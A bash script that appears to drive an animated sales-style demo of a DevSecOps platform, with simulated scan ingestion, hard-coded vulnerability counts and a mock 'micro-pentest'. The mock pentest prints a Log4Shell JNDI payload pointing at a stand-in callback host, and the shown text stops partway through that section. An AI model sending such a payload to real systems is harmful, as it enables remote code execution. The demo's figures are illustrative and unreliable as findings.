#!/usr/bin/env bash
# ============================================================================
#  ALDECI - Application Lifecycle DevSecOps CI
#  End-to-End Demo Runner with Fancy Animations
#  (Uses FixOps API/CLI under the hood)
# ============================================================================

set -e

# ============================================================================
# CONFIGURATION
# ============================================================================
FIXOPS_API_URL="${FIXOPS_API_URL:-http://127.0.0.1:8000}"
FIXOPS_API_TOKEN="${FIXOPS_API_TOKEN:?ERROR: FIXOPS_API_TOKEN must be set}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
SAMPLES_DIR="$PROJECT_ROOT/samples/api-examples/demo-scenarios"
DEMO_CONFIG="$PROJECT_ROOT/.demo-config.json"

# ============================================================================
# PLAIN MODE DETECTION - For terminal compatibility
# ============================================================================
# Set ALDECI_PLAIN=1 to force plain ASCII mode (no Unicode/emojis)
# Set NO_COLOR=1 to disable colors
# Set ALDECI_NO_ANIM=1 to disable animations

# Auto-detect if we should use plain mode
detect_plain_mode() {
    # Force plain mode if explicitly set
    [[ "${ALDECI_PLAIN:-}" == "1" ]] && return 0
    
    # Check if not a TTY
    [[ ! -t 1 ]] && return 0
    
    # Check for dumb terminal
    [[ "${TERM:-}" == "dumb" ]] && return 0
    
    # Check if locale doesn't support UTF-8
    if ! locale charmap 2>/dev/null | grep -qi 'utf-8'; then
        return 0
    fi
    
    # Check if terminal has limited color support
    local colors
    colors=$(tput colors 2>/dev/null || echo 0)
    [[ "$colors" -lt 8 ]] && return 0
    
    return 1
}

# Initialize plain mode
if detect_plain_mode; then
    PLAIN_MODE=1
else
    PLAIN_MODE="${ALDECI_PLAIN:-0}"
fi

# Disable colors if NO_COLOR is set
if [[ "${NO_COLOR:-}" == "1" ]]; then
    NO_COLORS=1
fi

# Disable animations if requested
NO_ANIM="${ALDECI_NO_ANIM:-0}"

# ============================================================================
# COLORS AND STYLING
# ============================================================================
if [[ "${NO_COLORS:-}" == "1" ]] || [[ "${NO_COLOR:-}" == "1" ]]; then
    RED=''
    GREEN=''
    YELLOW=''
    BLUE=''
    MAGENTA=''
    CYAN=''
    WHITE=''
    GRAY=''
    BOLD=''
    DIM=''
    NC=''
    ORANGE=''
    PINK=''
    LIME=''
    PURPLE=''
    GOLD=''
    TEAL=''
    BG_RED=''
    BG_GREEN=''
    BG_BLUE=''
    BG_MAGENTA=''
    BG_CYAN=''
else
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    MAGENTA='\033[0;35m'
    CYAN='\033[0;36m'
    WHITE='\033[1;37m'
    GRAY='\033[0;90m'
    BOLD='\033[1m'
    DIM='\033[2m'
    NC='\033[0m'
    # Extended colors for fancy effects
    ORANGE='\033[38;5;208m'
    PINK='\033[38;5;213m'
    LIME='\033[38;5;118m'
    PURPLE='\033[38;5;141m'
    GOLD='\033[38;5;220m'
    TEAL='\033[38;5;43m'
    # Background colors
    BG_RED='\033[41m'
    BG_GREEN='\033[42m'
    BG_BLUE='\033[44m'
    BG_MAGENTA='\033[45m'
    BG_CYAN='\033[46m'
fi

# ============================================================================
# FANCY ANIMATION FRAMES (with plain mode fallbacks)
# ============================================================================
if [[ "$PLAIN_MODE" == "1" ]]; then
    # Plain ASCII mode - compatible with all terminals
    SPINNER_DOTS=("-" "\\" "|" "/")
    SPINNER_BARS=("=" "=" "=" "=")
    SPINNER_CIRCLE=("-" "\\" "|" "/")
    SPINNER_ARROWS=("<" "^" ">" "v")
    SPINNER_BOUNCE=("." "o" "O" "o")
    SPINNER_GROW=("[" "[=" "[==" "[===" "[====" "[=====" "[======" "[======]")
    PROGRESS_BLOCKS=("." ":" "#" "#")
    MATRIX_CHARS=("0" "1" "2" "3" "4" "5" "6" "7" "8" "9" "A" "B" "C" "D" "E" "F")
    FIRE_CHARS=("*" "+" "x" "#" "@")
    SECURITY_ICONS=("[*]" "[+]" "[!]" "[#]" "[@]")
    CHECK_ICONS=("[x]" "[X]" "[+]" "[OK]")
    # Box drawing characters - ASCII fallback
    BOX_TL="+" BOX_TR="+" BOX_BL="+" BOX_BR="+"
    BOX_H="-" BOX_V="|" BOX_CROSS="+"
else
    # Fancy Unicode mode
    SPINNER_DOTS=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠏")
    SPINNER_BARS=("▁" "▂" "▃" "▄" "▅" "▆" "▇" "█" "▇" "▆" "▅" "▄" "▃" "▂")
    SPINNER_CIRCLE=("◐" "◓" "◑" "◒")
    SPINNER_ARROWS=("←" "↖" "↑" "↗" "→" "↘" "↓" "↙")
    SPINNER_BOUNCE=("⠁" "⠂" "⠄" "⠂")
    SPINNER_GROW=("▏" "▎" "▍" "▌" "▋" "▊" "▉" "█" "▉" "▊" "▋" "▌" "▍" "▎")
    PROGRESS_BLOCKS=("░" "▒" "▓" "█")
    MATRIX_CHARS=("ア" "イ" "ウ" "エ" "オ" "カ" "キ" "ク" "ケ" "コ" "サ" "シ" "ス" "セ" "ソ" "0" "1" "2" "3")
    FIRE_CHARS=("*" "+" "x" "#" "@")
    SECURITY_ICONS=("[*]" "[+]" "[!]" "[#]" "[@]")
    CHECK_ICONS=("[x]" "[X]" "[+]" "[OK]")
    # Box drawing characters - Unicode
    BOX_TL="╔" BOX_TR="╗" BOX_BL="╚" BOX_BR="╝"
    BOX_H="═" BOX_V="║" BOX_CROSS="╬"
fi

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

clear_screen() { printf '\033[2J\033[H'; }
hide_cursor() { printf '\033[?25l'; }
show_cursor() { printf '\033[?25h'; }
move_cursor() { printf '\033[%d;%dH' "$1" "$2"; }
get_term_width() { tput cols 2>/dev/null || echo 80; }
get_term_height() { tput lines 2>/dev/null || echo 24; }

center_text() {
    local text="$1"
    local width=$(get_term_width)
    local text_len=${#text}
    local padding=$(( (width - text_len) / 2 ))
    printf "%${padding}s%s\n" "" "$text"
}

# ============================================================================
# FANCY ANIMATION EFFECTS
# ============================================================================

# Rainbow text effect
rainbow_text() {
    local text="$1"
    local colors=("$RED" "$ORANGE" "$YELLOW" "$GREEN" "$CYAN" "$BLUE" "$PURPLE")
    local i=0
    for ((c=0; c<${#text}; c++)); do
        printf "${colors[$((i % ${#colors[@]}))]}%s" "${text:$c:1}"
        ((i++))
    done
    printf "${NC}\n"
}

# Gradient text effect
gradient_text() {
    local text="$1"
    local start_color="${2:-38;5;39}"  # Default: cyan
    local end_color="${3:-38;5;199}"   # Default: pink
    local len=${#text}
    for ((i=0; i<len; i++)); do
        local ratio=$((i * 100 / len))
        local color=$((39 + ratio * 160 / 100))
        printf "\033[38;5;${color}m%s" "${text:$i:1}"
    done
    printf "${NC}\n"
}

# Typewriter effect with cursor
typewriter_fancy() {
    local text="$1"
    local delay="${2:-0.02}"
    local cursor_char="▌"
    hide_cursor
    for ((i=0; i<${#text}; i++)); do
        printf "%s${CYAN}${cursor_char}${NC}" "${text:$i:1}"
        sleep "$delay"
        printf "\b \b"
    done
    printf "%s\n" "${text:$((${#text}-1)):1}"
    show_cursor
}

# Matrix rain effect (enhanced)
matrix_rain_fancy() {
    local duration="${1:-2}"
    
    # Skip animation in plain mode or if animations disabled
    if [[ "$PLAIN_MODE" == "1" ]] || [[ "$NO_ANIM" == "1" ]]; then
        echo ""
        echo "  [Loading...]"
        echo ""
        return
    fi
    
    local width=$(get_term_width)
    local height=8
    hide_cursor
    
    for ((t=0; t<duration*10; t++)); do
        for ((y=0; y<height; y++)); do
            for ((x=0; x<width; x++)); do
                if (( RANDOM % 4 == 0 )); then
                    local brightness=$((RANDOM % 3))
                    case $brightness in
                        0) printf "${DIM}${GREEN}%s${NC}" "${MATRIX_CHARS[$((RANDOM % ${#MATRIX_CHARS[@]}))]}" ;;
                        1) printf "${GREEN}%s${NC}" "${MATRIX_CHARS[$((RANDOM % ${#MATRIX_CHARS[@]}))]}" ;;
                        2) printf "${BOLD}${LIME}%s${NC}" "${MATRIX_CHARS[$((RANDOM % ${#MATRIX_CHARS[@]}))]}" ;;
                    esac
                else
                    printf " "
                fi
            done
            printf "\n"
        done
        sleep 0.08
        printf '\033[%dA' "$height"
    done
    
    # Clear the matrix area
    for ((y=0; y<height; y++)); do
        printf "%${width}s\n" ""
    done
    printf '\033[%dA' "$height"
    show_cursor
}

# Pulse animation
pulse_animation() {
    local text="$1"
    local count="${2:-3}"
    local colors=("$DIM" "$NC" "$BOLD" "$WHITE" "$BOLD" "$NC" "$DIM")
    hide_cursor
    for ((i=0; i<count; i++)); do
        for color in "${colors[@]}"; do
            printf "\r${color}${CYAN}%s${NC}   " "$text"
            sleep 0.08
        done
    done
    printf "\r${BOLD}${GREEN}%s${NC}   \n" "$text"
    show_cursor
}

# Scanning effect
scanning_effect() {
    local text="$1"
    local width=${#text}
    hide_cursor
    for ((i=0; i<=width; i++)); do
        printf "\r${GREEN}%s${NC}${BG_GREEN}${WHITE}%s${NC}${GRAY}%s${NC}" \
            "${text:0:$i}" "${text:$i:1}" "${text:$((i+1))}"
        sleep 0.03
    done
    printf "\r${GREEN}%s${NC}\n" "$text"
    show_cursor
}

# Loading bar with percentage
loading_bar_fancy() {
    local message="$1"
    local duration="${2:-3}"
    local width=40
    hide_cursor
    
    for ((i=0; i<=100; i+=2)); do
        local filled=$((i * width / 100))
        local empty=$((width - filled))
        
        printf "\r${CYAN}%s${NC} [" "$message"
        
        # Gradient fill
        for ((j=0; j<filled; j++)); do
            local color=$((39 + j * 160 / width))
            printf "\033[38;5;${color}m█"
        done
        printf "${NC}"
        
        printf "%${empty}s" | tr ' ' '░'
        printf "] ${BOLD}${WHITE}%3d%%${NC}" "$i"
        
        sleep $(awk "BEGIN {printf \"%.3f\", $duration / 50}")
    done
    printf "\n"
    show_cursor
}

# Spinner with message
spinner_fancy() {
    local pid=$1
    local message="${2:-Processing}"
    local spinner_type="${3:-dots}"
    local i=0
    
    case "$spinner_type" in
        dots) local frames=("${SPINNER_DOTS[@]}") ;;
        bars) local frames=("${SPINNER_BARS[@]}") ;;
        circle) local frames=("${SPINNER_CIRCLE[@]}") ;;
        arrows) local frames=("${SPINNER_ARROWS[@]}") ;;
        bounce) local frames=("${SPINNER_BOUNCE[@]}") ;;
        grow) local frames=("${SPINNER_GROW[@]}") ;;
        *) local frames=("${SPINNER_DOTS[@]}") ;;
    esac
    
    hide_cursor
    while kill -0 "$pid" 2>/dev/null; do
        printf "\r${CYAN}${frames[$i]}${NC} ${message}..."
        i=$(( (i + 1) % ${#frames[@]} ))
        sleep 0.1
    done
    printf "\r${GREEN}✓${NC} ${message}... ${GREEN}Done!${NC}     \n"
    show_cursor
}

# Fire effect text
fire_text() {
    local text="$1"
    hide_cursor
    for ((i=0; i<5; i++)); do
        printf "\r"
        for ((c=0; c<${#text}; c++)); do
            local fire="${FIRE_CHARS[$((RANDOM % ${#FIRE_CHARS[@]}))]}"
            printf "${ORANGE}%s${NC}" "${text:$c:1}"
        done
        printf " ${FIRE_CHARS[$((RANDOM % ${#FIRE_CHARS[@]}))]}"
        sleep 0.15
    done
    printf "\r${BOLD}${ORANGE}%s${NC} 🔥\n" "$text"
    show_cursor
}

# Security shield animation
security_animation() {
    local message="$1"
    hide_cursor
    for icon in "${SECURITY_ICONS[@]}"; do
        printf "\r%s ${CYAN}%s${NC}" "$icon" "$message"
        sleep 0.3
    done
    printf "\r${GREEN}🛡️  %s${NC}\n" "$message"
    show_cursor
}

# ============================================================================
# BOX DRAWING
# ============================================================================

draw_fancy_box() {
    local title="$1"
    local width="${2:-70}"
    local style="${3:-double}"  # single, double, rounded, heavy
    
    local tl tr bl br h v ml mr
    if [[ "$PLAIN_MODE" == "1" ]]; then
        # Plain ASCII mode
        tl="+" tr="+" bl="+" br="+" h="-" v="|" ml="+" mr="+"
    else
        case "$style" in
            single)  tl="┌" tr="┐" bl="└" br="┘" h="─" v="│" ml="├" mr="┤" ;;
            double)  tl="╔" tr="╗" bl="╚" br="╝" h="═" v="║" ml="╠" mr="╣" ;;
            rounded) tl="╭" tr="╮" bl="╰" br="╯" h="─" v="│" ml="├" mr="┤" ;;
            heavy)   tl="┏" tr="┓" bl="┗" br="┛" h="━" v="┃" ml="┣" mr="┫" ;;
        esac
    fi
    
    printf "${CYAN}${tl}"
    printf -- "${h}%.0s" $(seq 1 $((width-2)))
    printf "${tr}${NC}\n"
    
    if [[ -n "$title" ]]; then
        local padding=$(( (width - 2 - ${#title}) / 2 ))
        printf "${CYAN}${v}${NC}"
        printf "%${padding}s${BOLD}${WHITE}%s${NC}%$((width - 2 - padding - ${#title}))s" "" "$title" ""
        printf "${CYAN}${v}${NC}\n"
        
        printf "${CYAN}${ml}"
        printf -- "${h}%.0s" $(seq 1 $((width-2)))
        printf "${mr}${NC}\n"
    fi
}

draw_fancy_box_line() {
    local text="$1"
    local width="${2:-70}"
    local icon="${3:-}"
    local v
    if [[ "$PLAIN_MODE" == "1" ]]; then
        v="|"
        # Strip emojis in plain mode
        icon=""
    else
        v="║"
    fi
    
    local display_text="$text"
    [[ -n "$icon" ]] && display_text="$icon $text"
    
    local text_len=${#display_text}
    local padding=$((width - 4 - text_len))
    if ((padding < 0)); then padding=0; fi
    
    printf "${CYAN}${v}${NC} %s%${padding}s ${CYAN}${v}${NC}\n" "$display_text" ""
}

draw_fancy_box_bottom() {
    local width="${1:-70}"
    local bl br h
    if [[ "$PLAIN_MODE" == "1" ]]; then
        bl="+" br="+" h="-"
    else
        bl="╚" br="╝" h="═"
    fi
    printf "${CYAN}${bl}"
    printf -- "${h}%.0s" $(seq 1 $((width-2)))
    printf "${br}${NC}\n"
}

# ============================================================================
# MEGA BANNER
# ============================================================================

show_mega_banner() {
    clear_screen
    hide_cursor
    
    # Matrix rain intro (skipped in plain mode)
    matrix_rain_fancy 1
    
    if [[ "$PLAIN_MODE" == "1" ]]; then
        # Simple ASCII banner for plain mode
        echo ""
        echo "    =============================================="
        echo "                    A L D E C I"
        echo "    =============================================="
        echo "    Application Lifecycle DevSecOps CI Platform"
        echo "    End-to-End Security Demo Suite (FixOps API)"
        echo "    =============================================="
        echo ""
        echo "    Powered by AI-Driven Security Intelligence"
        echo ""
    else
        local banner=(
            "     █████╗ ██╗     ██████╗ ███████╗ ██████╗██╗"
            "    ██╔══██╗██║     ██╔══██╗██╔════╝██╔════╝██║"
            "    ███████║██║     ██║  ██║█████╗  ██║     ██║"
            "    ██╔══██║██║     ██║  ██║██╔══╝  ██║     ██║"
            "    ██║  ██║███████╗██████╔╝███████╗╚██████╗██║"
            "    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝ ╚═════╝╚═╝"
        )
        
        echo
        # Animate banner with gradient
        for ((i=0; i<${#banner[@]}; i++)); do
            local color=$((39 + i * 30))
            printf "\033[38;5;${color}m"
            center_text "${banner[$i]}"
            printf "${NC}"
            sleep 0.08
        done
        
        echo
        rainbow_text "    +------------------------------------------------------------+"
        rainbow_text "    |   Application Lifecycle DevSecOps CI Platform             |"
        rainbow_text "    |      End-to-End Security Demo Suite (FixOps API)          |"
        rainbow_text "    +------------------------------------------------------------+"
        echo
        
        # Animated tagline
        pulse_animation "    [*] Powered by AI-Driven Security Intelligence"
    fi
    
    echo
    show_cursor
}

# ============================================================================
# CUSTOMER CONFIGURATION
# ============================================================================

# Default demo configuration - 14 applications across different portfolios
DEFAULT_APPS=(
    # Original 4 applications
    "payment-gateway"           # Java/Spring Boot - PCI-DSS - Fintech
    "user-identity-service"     # Node.js/Express - SOC2/GDPR - IAM
    "healthcare-api"            # Python/FastAPI - HIPAA - Healthcare
    "supply-chain-portal"       # Ruby on Rails - GDPR - Logistics
    # 10 new applications with different architectures
    "trading-engine"            # Rust/Actix - PCI-DSS/SOC2 - High-frequency trading
    "iot-device-hub"            # Go/Gin - IoT Security - Edge computing
    "ml-inference-service"      # Python/TensorFlow - AI/ML Security - Data science
    "mobile-banking-bff"        # Kotlin/Ktor - PCI-DSS - Mobile backend
    "legacy-mainframe-adapter"  # COBOL/.NET Bridge - SOC2 - Legacy integration
    "realtime-analytics"        # Scala/Spark - GDPR - Big data
    "gaming-matchmaker"         # C++/gRPC - Privacy - Gaming
    "media-transcoder"          # Go/FFmpeg - Content Security - Media
    "blockchain-bridge"         # Solidity/Node.js - Crypto Compliance - Web3
    "edge-cdn-service"          # Rust/Cloudflare Workers - DDoS Protection - Edge
)
DEFAULT_FRAMEWORKS=("pci-dss" "soc2" "hipaa" "gdpr" "iso27001" "nist-csf" "fedramp" "ccpa")
DEFAULT_TOOLS_SAST=("sonarqube" "checkmarx" "semgrep" "bandit")
DEFAULT_TOOLS_DAST=("owasp-zap" "burp-suite")
DEFAULT_TOOLS_SCA=("snyk" "dependabot" "trivy" "safety")
DEFAULT_TOOLS_CONTAINER=("trivy" "grype" "prisma-cloud")
DEFAULT_TOOLS_CLOUD=("aws-security-hub" "wiz" "orca")
DEFAULT_TOOLS_RUNTIME=("falco" "sysdig")

# Current configuration
DEMO_APPS=("${DEFAULT_APPS[@]}")
DEMO_FRAMEWORKS=("${DEFAULT_FRAMEWORKS[@]}")

load_demo_config() {
    if [[ -f "$DEMO_CONFIG" ]]; then
        echo "Loading saved configuration..."
        # Parse JSON config if exists using mapfile to avoid word splitting issues (SC2207)
        if command -v jq &>/dev/null; then
            local apps_output
            apps_output=$(jq -r '.applications[]' "$DEMO_CONFIG" 2>/dev/null)
            if [[ -n "$apps_output" ]]; then
                mapfile -t DEMO_APPS <<< "$apps_output"
            fi
            local frameworks_output
            frameworks_output=$(jq -r '.frameworks[]' "$DEMO_CONFIG" 2>/dev/null)
            if [[ -n "$frameworks_output" ]]; then
                mapfile -t DEMO_FRAMEWORKS <<< "$frameworks_output"
            fi
        fi
    fi
}

save_demo_config() {
    cat > "$DEMO_CONFIG" << EOF
{
  "applications": $(printf '%s\n' "${DEMO_APPS[@]}" | jq -R . | jq -s .),
  "frameworks": $(printf '%s\n' "${DEMO_FRAMEWORKS[@]}" | jq -R . | jq -s .),
  "last_updated": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
}
EOF
    echo "Configuration saved to $DEMO_CONFIG"
}

customize_applications() {
    clear_screen
    show_cursor
    
    draw_fancy_box "Customize Applications" 70 "double"
    draw_fancy_box_line "Current applications:" 70
    for ((i=0; i<${#DEMO_APPS[@]}; i++)); do
        draw_fancy_box_line "  $((i+1)). ${DEMO_APPS[$i]}" 70
    done
    draw_fancy_box_line "" 70
    draw_fancy_box_line "Options:" 70
    draw_fancy_box_line "  [a] Add application" 70
    draw_fancy_box_line "  [r] Remove application" 70
    draw_fancy_box_line "  [e] Edit application name" 70
    draw_fancy_box_line "  [d] Reset to defaults" 70
    draw_fancy_box_line "  [b] Back to menu" 70
    draw_fancy_box_bottom 70
    
    echo
    printf "  ${CYAN}Enter choice:${NC} "
    read -r choice
    
    case "$choice" in
        a)
            printf "  ${CYAN}Enter new application name:${NC} "
            read -r new_app
            if [[ -n "$new_app" ]]; then
                DEMO_APPS+=("$new_app")
                echo "  ${GREEN}Added: $new_app${NC}"
                save_demo_config
            fi
            ;;
        r)
            printf "  ${CYAN}Enter number to remove:${NC} "
            read -r num
            if [[ "$num" =~ ^[0-9]+$ ]] && ((num > 0 && num <= ${#DEMO_APPS[@]})); then
                removed="${DEMO_APPS[$((num-1))]}"
                unset 'DEMO_APPS[$((num-1))]'
                DEMO_APPS=("${DEMO_APPS[@]}")
                echo "  ${YELLOW}Removed: $removed${NC}"
                save_demo_config
            fi
            ;;
        e)
            printf "  ${CYAN}Enter number to edit:${NC} "
            read -r num
            if [[ "$num" =~ ^[0-9]+$ ]] && ((num > 0 && num <= ${#DEMO_APPS[@]})); then
                printf "  ${CYAN}Enter new name:${NC} "
                read -r new_name
                if [[ -n "$new_name" ]]; then
                    DEMO_APPS[$((num-1))]="$new_name"
                    echo "  ${GREEN}Updated to: $new_name${NC}"
                    save_demo_config
                fi
            fi
            ;;
        d)
            DEMO_APPS=("${DEFAULT_APPS[@]}")
            echo "  ${GREEN}Reset to defaults${NC}"
            save_demo_config
            ;;
    esac
    
    sleep 1
}

customize_frameworks() {
    clear_screen
    show_cursor
    
    draw_fancy_box "Customize Compliance Frameworks" 70 "double"
    draw_fancy_box_line "Current frameworks:" 70
    for ((i=0; i<${#DEMO_FRAMEWORKS[@]}; i++)); do
        draw_fancy_box_line "  $((i+1)). ${DEMO_FRAMEWORKS[$i]}" 70
    done
    draw_fancy_box_line "" 70
    draw_fancy_box_line "Available frameworks:" 70
    draw_fancy_box_line "  pci-dss, soc2, hipaa, gdpr, iso27001, nist-800-53" 70
    draw_fancy_box_line "  hitrust, fedramp, cis, ccpa, sox" 70
    draw_fancy_box_line "" 70
    draw_fancy_box_line "Options:" 70
    draw_fancy_box_line "  [a] Add framework" 70
    draw_fancy_box_line "  [r] Remove framework" 70
    draw_fancy_box_line "  [d] Reset to defaults" 70
    draw_fancy_box_line "  [b] Back to menu" 70
    draw_fancy_box_bottom 70
    
    echo
    printf "  ${CYAN}Enter choice:${NC} "
    read -r choice
    
    case "$choice" in
        a)
            printf "  ${CYAN}Enter framework name:${NC} "
            read -r new_fw
            if [[ -n "$new_fw" ]]; then
                DEMO_FRAMEWORKS+=("$new_fw")
                echo "  ${GREEN}Added: $new_fw${NC}"
                save_demo_config
            fi
            ;;
        r)
            printf "  ${CYAN}Enter number to remove:${NC} "
            read -r num
            if [[ "$num" =~ ^[0-9]+$ ]] && ((num > 0 && num <= ${#DEMO_FRAMEWORKS[@]})); then
                removed="${DEMO_FRAMEWORKS[$((num-1))]}"
                unset 'DEMO_FRAMEWORKS[$((num-1))]'
                DEMO_FRAMEWORKS=("${DEMO_FRAMEWORKS[@]}")
                echo "  ${YELLOW}Removed: $removed${NC}"
                save_demo_config
            fi
            ;;
        d)
            DEMO_FRAMEWORKS=("${DEFAULT_FRAMEWORKS[@]}")
            echo "  ${GREEN}Reset to defaults${NC}"
            save_demo_config
            ;;
    esac
    
    sleep 1
}

# ============================================================================
# DEMO SCENARIOS
# ============================================================================

run_scenario_overview() {
    clear_screen
    show_mega_banner
    
    echo
    draw_fancy_box "Demo Scenario Overview" 70 "double"
    draw_fancy_box_line "" 70
    draw_fancy_box_line "📱 Applications:" 70
    for app in "${DEMO_APPS[@]}"; do
        draw_fancy_box_line "    • $app" 70 "🔹"
    done
    draw_fancy_box_line "" 70
    draw_fancy_box_line "📋 Compliance Frameworks:" 70
    for fw in "${DEMO_FRAMEWORKS[@]}"; do
        draw_fancy_box_line "    • ${fw^^}" 70 "🔹"
    done
    draw_fancy_box_line "" 70
    draw_fancy_box_line "🔧 Security Tools:" 70
    draw_fancy_box_line "    SAST: SonarQube, Checkmarx, Semgrep, Bandit" 70
    draw_fancy_box_line "    DAST: OWASP ZAP, Burp Suite" 70
    draw_fancy_box_line "    SCA: Snyk, Dependabot, Trivy, Safety" 70
    draw_fancy_box_line "    Container: Trivy, Grype, Prisma Cloud" 70
    draw_fancy_box_line "    Cloud: AWS Security Hub, Wiz, Orca" 70
    draw_fancy_box_line "    Runtime: Falco, Sysdig" 70
    draw_fancy_box_bottom 70
    
    echo
    printf "  ${CYAN}Press Enter to continue...${NC}"
    read -r
}

run_demo_ingestion() {
    clear_screen
    echo
    fire_text "  PHASE 1: DATA INGESTION"
    echo
    
    security_animation "Uploading security scan data..."
    echo
    
    # Simulate ingestion of different scan types
    local scan_types=("SBOM" "CVE Feed" "SARIF Scans" "CNAPP Findings" "VEX Documents")
    
    for scan in "${scan_types[@]}"; do
        printf "  ${CYAN}Ingesting ${scan}...${NC}"
        sleep 0.5
        
        # Simulate API call
        (sleep $((RANDOM % 2 + 1))) &
        spinner_fancy $! "Processing $scan" "dots"
    done
    
    echo
    loading_bar_fancy "Correlating findings across sources" 2
    
    echo
    printf "  ${GREEN}✓ All scan data ingested successfully${NC}\n"
    echo
    
    printf "  ${CYAN}Press Enter to continue...${NC}"
    read -r
}

run_demo_analysis() {
    clear_screen
    echo
    gradient_text "  PHASE 2: SECURITY ANALYSIS"
    echo
    
    pulse_animation "  Running AI-powered security analysis..."
    echo
    
    # Analysis steps
    local steps=(
        "Vulnerability correlation"
        "Risk scoring with EPSS/KEV"
        "Reachability analysis"
        "Compliance mapping"
        "Remediation prioritization"
    )
    
    for ((i=0; i<${#steps[@]}; i++)); do
        printf "  ${YELLOW}[$((i+1))/${#steps[@]}]${NC} "
        scanning_effect "${steps[$i]}"
        sleep 0.3
    done
    
    echo
    draw_fancy_box "Analysis Results" 60 "rounded"
    draw_fancy_box_line "Total Vulnerabilities: 47" 60 "🔴"
    draw_fancy_box_line "  Critical: 8" 60
    draw_fancy_box_line "  High: 15" 60
    draw_fancy_box_line "  Medium: 18" 60
    draw_fancy_box_line "  Low: 6" 60
    draw_fancy_box_line "" 60
    draw_fancy_box_line "Compliance Status:" 60 "📋"
    draw_fancy_box_line "  PCI-DSS: 4 non-compliant controls" 60
    draw_fancy_box_line "  SOC2: 2 exceptions" 60
    draw_fancy_box_line "  HIPAA: 6 non-compliant safeguards" 60
    draw_fancy_box_line "  GDPR: 2 non-compliant articles" 60
    draw_fancy_box_bottom 60
    
    echo
    printf "  ${CYAN}Press Enter to continue...${NC}"
    read -r
}

# ============================================================================
# SUPER CLASSY ANIMATED MICRO-PENTEST DEMO
# ============================================================================

draw_attack_path_ascii() {
    local path_name="$1"
    echo
    printf "${CYAN}"
    cat << 'EOF'
    ┌─────────────┐     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
    │   INTERNET  │────▶│  LOAD BAL   │────▶│    APP      │────▶│  DATABASE   │
    │   🌐        │     │   ⚖️        │     │   🖥️        │     │   🗄️        │
    └─────────────┘     └─────────────┘     └─────────────┘     └─────────────┘
          │                   │                   │                   │
          ▼                   ▼                   ▼                   ▼
       EXTERNAL            DMZ ZONE          APP ZONE           DATA ZONE
EOF
    printf "${NC}\n"
}

animate_exploit_step() {
    local step_num="$1"
    local step_name="$2"
    local status="$3"
    local detail="$4"
    
    # Neon glow effect colors
    local NEON_CYAN='\033[38;5;51m'
    local NEON_GREEN='\033[38;5;46m'
    local NEON_RED='\033[38;5;196m'
    local NEON_YELLOW='\033[38;5;226m'
    local NEON_PURPLE='\033[38;5;165m'
    
    printf "    ${NEON_CYAN}┃${NC} "
    
    # Animated step indicator
    for i in 1 2 3; do
        printf "\r    ${NEON_CYAN}┃${NC} ${NEON_PURPLE}[${i}]${NC} "
        sleep 0.1
    done
    
    printf "\r    ${NEON_CYAN}┃${NC} ${NEON_YELLOW}[STEP ${step_num}]${NC} "
    
    # Typewriter effect for step name
    for ((c=0; c<${#step_name}; c++)); do
        printf "${BOLD}${WHITE}%s${NC}" "${step_name:$c:1}"
        sleep 0.02
    done
    
    sleep 0.3
    
    # Status with appropriate color
    case "$status" in
        "success") printf " ${NEON_GREEN}✓ SUCCESS${NC}" ;;
        "failed") printf " ${NEON_RED}✗ BLOCKED${NC}" ;;
        "warning") printf " ${NEON_YELLOW}⚠ PARTIAL${NC}" ;;
    esac
    
    printf "\n"
    
    # Detail line with dimmed effect
    if [[ -n "$detail" ]]; then
        printf "    ${NEON_CYAN}┃${NC}   ${DIM}└─ ${detail}${NC}\n"
    fi
}

run_animated_micropentest() {
    clear_screen
    hide_cursor
    
    # Cyberpunk-style header
    echo
    printf "${BOLD}"
    gradient_text "  ╔═══════════════════════════════════════════════════════════════════╗"
    gradient_text "  ║   🔥 MICRO-PENTEST ENGINE v3.2.1 - AUTOMATED EXPLOIT VALIDATION 🔥  ║"
    gradient_text "  ╚═══════════════════════════════════════════════════════════════════╝"
    printf "${NC}\n"
    
    # Matrix rain intro
    matrix_rain_fancy 1
    
    # Target selection animation
    echo
    fire_text "  TARGET: realtime-analytics (CVE-2021-44228 - Log4Shell)"
    echo
    
    # Animated scanning effect
    printf "  ${CYAN}Initializing exploit validation engine...${NC}\n"
    loading_bar_fancy "Loading attack modules" 2
    
    echo
    draw_fancy_box "EXPLOIT EXECUTION FLOW" 75 "heavy"
    draw_fancy_box_line "" 75
    
    # Animated exploit steps
    local NEON_CYAN='\033[38;5;51m'
    
    printf "    ${NEON_CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}\n"
    
    animate_exploit_step "1" "RECONNAISSANCE" "success" "Identified Log4j 2.14.1 via error fingerprinting"
    sleep 0.5
    
    animate_exploit_step "2" "PAYLOAD CRAFTING" "success" "Generated JNDI lookup: \${jndi:ldap://callback/a}"
    sleep 0.5
    
    animate_exploit_step "3" "INJECTION" "success" "Payload injected via User-Agent header"
    sleep 0.5
    
    # Animated callback waiting
    printf "    ${NEON_CYAN}┃${NC} ${YELLOW}[STEP 4]${NC} ${BOLD}CALLBACK VERIFICATION${NC}"
    for i in {1..10}; do
        printf "."
        sleep 0.2
    done
    printf " ${GREEN}✓ DNS CALLBACK RECEIVED${NC}\n"
    printf "    ${NEON_CYAN}┃${NC}   ${DIM}└─ Source IP: 10.0.1.45 (target confirmed)${NC}\n"
    sleep 0.5
    
    animate_exploit_step "5" "RCE VALIDATION" "success" "Command executed: hostname=analytics-prod-01"
    
    printf "    ${NEON_CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}\n"
    
    draw_fancy_box_line "" 75
    draw_fancy_box_bottom 75
    
    echo
    # Impact assessment with pulsing effect
    pulse_animation "  ⚠️  VULNERABILITY CONFIRMED EXPLOITABLE - CONFIDENCE: 98.5%"
    
    echo
    draw_fancy_box "IMPACT ASSESSMENT" 60 "double"
